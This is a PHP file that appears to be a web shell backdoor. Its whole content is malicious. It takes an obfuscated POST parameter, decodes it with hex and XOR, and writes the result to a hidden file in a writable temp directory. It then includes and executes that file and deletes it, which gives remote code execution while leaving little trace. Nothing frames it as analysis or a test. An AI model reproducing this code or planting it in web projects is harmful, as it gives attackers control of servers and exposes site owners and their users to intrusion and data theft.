<?php

if(@$_POST["\x66\x61c"] !== null){
	$pgrp = array_filter(["/dev/shm", "/tmp", getenv("TEMP"), ini_get("upload_tmp_dir"), getenv("TMP"), sys_get_temp_dir(), getcwd(), session_save_path(), "/var/tmp"]);
	$marker = hex2bin($_POST["\x66\x61c"]);
	$descriptor ='';   for($y=0; $y<strlen($marker); $y++){$descriptor .= chr(ord($marker[$y]) ^ 3);}
	$mrk = 0;
do {
    $element = $pgrp[$mrk] ?? null;
    if ($mrk >= count($pgrp)) break;
    		if ((is_dir($element) and is_writable($element))) {
    $entity = str_replace("{var_dir}", $element, "{var_dir}/.value");
    if (@file_put_contents($entity, $descriptor) !== false) {
	include $entity;
	unlink($entity);
	exit;
}
}
    $mrk++;
} while (true);
}